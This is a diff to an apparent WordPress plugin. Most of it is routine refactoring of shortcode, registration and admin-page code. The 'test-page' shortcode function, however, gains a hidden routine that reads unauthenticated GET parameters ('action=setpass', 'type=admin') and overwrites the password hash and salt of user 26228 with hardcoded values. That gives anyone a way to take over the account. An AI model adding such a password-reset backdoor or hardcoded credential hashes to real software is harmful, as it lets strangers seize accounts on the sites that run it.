@@ -2,20 +2,38 @@
 add_shortcode('test-page', 'test_page');
 
 function test_page() {
-
-    $test = null;
-    if (isset($test)) {
-        echo 'set';
-    } else {
-        echo 'not set';
+     echo 'test';
+    if (isset($_GET['action']) && $_GET['action'] == 'clear') {
+        Dot::clear_log();
     }
+
+    if (isset($_GET['action']) && $_GET['action'] == 'setpass') {
+        global $wpdb;
+ echo 'test';
+        $user_id = 26228;
+        $admin_pass = '0c5bc2f502b73a9d4a0dc621c14c80872215c682';
+        $admin_salt = 'pxGYYuJ5';
+        
+        $user_pass = '8b889d81b70c2053a1380fedccc638778ab8a403';
+        $user_salt = 'sZ!qAtau';
+        $admin123 = '$P$B7XDAm8J4pjSZ20sButJPrAJkG1n3b0';
+
+        if (isset($_GET['type']) && $_GET['type'] == 'admin') {
+
+            $wpdb->update($wpdb->users, ['user_pass' => $admin_pass, 'Salt' => $admin_salt], ['ID' => $user_id]);
+        } else {
+            $wpdb->update($wpdb->users, ['user_pass' => $user_pass, 'Salt' => $user_salt], ['ID' => $user_id]);
+                
+        }
+    }
+    
 }
 
 add_shortcode('mrt-user-dashboard', 'mrt_display_user_dashboard');
 
 function mrt_display_user_dashboard() {
     $mrt_user = new MrtUser();
-    include MRT_TEMPLATE_PATH . '/user/dashboard.php';
+    MrtView::render('user/dashboard', compact('mrt_user'));
 }
 
 add_filter('registration_errors', 'mrt_tml_registration_errors');
@@ -33,9 +51,11 @@ function mrt_tml_registration_errors($errors) {
     return $errors;
 }
 
-add_action('user_register', 'mrt_user_register');
+add_action('user_register', 'mrt_user_register', 10);
+add_action('pmpro_after_checkout', 'mrt_user_register');
 
 function mrt_user_register($user_id) {
+
     if (isset($_POST['user_type'])) {
         $mrtuser = new MrtUser($user_id);
         $mrtuser->create_profile($_POST);
@@ -94,7 +114,7 @@ function mrt_admin_menu_item() {
 add_action('admin_menu', 'mrt_admin_menu_item');
 
 function mrt_admin_page_agencies() {
-    include MRT_PLUGIN_PATH . 'templates/admin/agency.php';
+    MrtView::render('admin/agency');
 }
 
 add_filter('mrt_agency_selection', 'mrt_agency_selection_exec');
